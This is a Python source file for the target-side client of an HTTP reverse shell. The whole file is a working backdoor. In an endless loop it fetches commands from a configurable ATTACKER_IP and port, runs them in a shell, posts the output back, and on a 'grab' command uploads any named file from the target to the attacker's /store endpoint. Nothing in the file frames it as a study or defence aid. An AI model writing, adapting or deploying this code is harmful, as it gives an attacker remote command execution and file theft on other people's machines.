#Client ---> runs on target

from urllib import request, parse
import requests
import subprocess
import time
import os

ATTACKER_IP = '127.0.0.1' # change this to the attacker's IP address
ATTACKER_PORT = 8080

# data = parse.urlencode(<your data dict>).encode()
# req =  request.Request(<your url>, data=data) # this will make the method "POST"
# resp = request.urlopen(req)

def send_file(command):
    try:
        grab, path = command.strip().split(' ')
    except ValueError:
        requests.post(url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}', \
                      data='[-] Invalid grab command (maybe multiple spaces)')
        return

    if not os.path.exists(path):
        requests.post(url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}', \
                      data='[-] Not able to find the file' )
        return

    url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/store' # Posts to /store
    files = {'file': open(path, 'rb')}
    requests.post(url, files=files)
    #requests library use POST method called "multipart/form-data"


def run_command(command):
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    requests.post(url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}', data=CMD.stdout.read() )
    requests.post(url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}', data=CMD.stderr.read() )


while True:
    command = request.urlopen(f"http://{ATTACKER_IP}:{ATTACKER_PORT}").read().decode()

    if 'terminate' in command:
        break

    # Send file
    if 'grab' in command:
        send_file(command)
        continue

    run_command(command)
    time.sleep(1)


